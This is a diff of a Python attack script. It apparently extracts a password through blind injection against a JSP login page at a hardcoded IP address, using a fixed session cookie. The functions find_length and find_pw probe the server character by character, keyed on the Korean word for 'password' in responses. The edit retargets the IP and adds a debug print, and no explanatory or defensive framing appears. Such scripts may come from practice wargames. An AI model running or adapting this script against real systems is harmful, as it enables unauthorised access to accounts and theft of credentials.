@@ -1,7 +1,7 @@
 import requests
 import time
 
-url = "http://3.36.127.85:8000/action/login_action_2.jsp"
+url = "http://3.35.113.45:8000/action/login_action_2.jsp"
 cookie = {'JSESSIONID': '6539B47081BDBCB23CDC83A6C4BF7CF0'}
 
 def find_length():
@@ -13,6 +13,7 @@ def find_length():
         if "패스워드" in req.text:
             return pwlength
         else:
+            print(param)
             pwlength += 1
 
 def find_pw():
